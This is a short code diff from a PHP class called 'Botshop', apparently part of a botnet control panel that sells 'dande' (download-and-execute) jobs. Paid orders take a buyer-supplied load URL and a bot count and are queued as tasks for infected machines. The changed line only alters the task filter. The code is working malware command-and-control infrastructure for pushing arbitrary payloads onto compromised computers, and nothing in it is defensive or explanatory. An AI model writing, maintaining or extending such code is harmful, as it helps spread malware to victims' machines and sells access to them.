@@ -78,7 +78,7 @@ class Botshop{
             $orderId = $GLOBALS["pdo"]->lastInsertId();
 
             $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, task, command, execution_limit) VALUES (?, ?, ?, ?, ?)");
-            $statement->execute(array('[]', 0, 'dande', $_POST["loadurl"], $_POST["amount"]));
+            $statement->execute(array('{"onlybot":""}', 0, 'dande', $_POST["loadurl"], $_POST["amount"]));
             $taskid = $GLOBALS["pdo"]->lastInsertId();
 
             $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ?, taskid = ? WHERE id = ?");
